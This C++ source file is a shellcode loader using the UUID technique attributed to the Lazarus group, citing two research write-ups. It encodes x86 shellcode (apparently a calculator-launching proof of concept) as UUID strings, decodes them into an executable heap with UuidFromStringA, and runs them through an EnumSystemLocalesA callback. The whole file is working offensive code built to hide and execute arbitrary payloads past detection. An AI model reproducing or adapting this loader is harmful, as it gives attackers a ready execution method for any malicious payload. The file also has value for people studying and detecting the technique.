// https://adepts.of0x.cc/alternatives-copy-shellcode/
// https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    "6850c031-6163-636c-5459-504092741551",
    "2f728b64-768b-8b0c-760c-ad8b308b7e18",
    "1aeb50b2-60b2-2948-d465-488b32488b76",
    "768b4818-4810-48ad-8b30-488b7e300357",
    "175c8b3c-8b28-1f74-2048-01fe8b541f24",
    "172cb70f-528d-ad02-813c-0757696e4575",
    "1f748bef-481c-fe01-8b34-ae4801f799ff",
    "000000d7-0000-0000-0000-000000000000",
};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems*16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}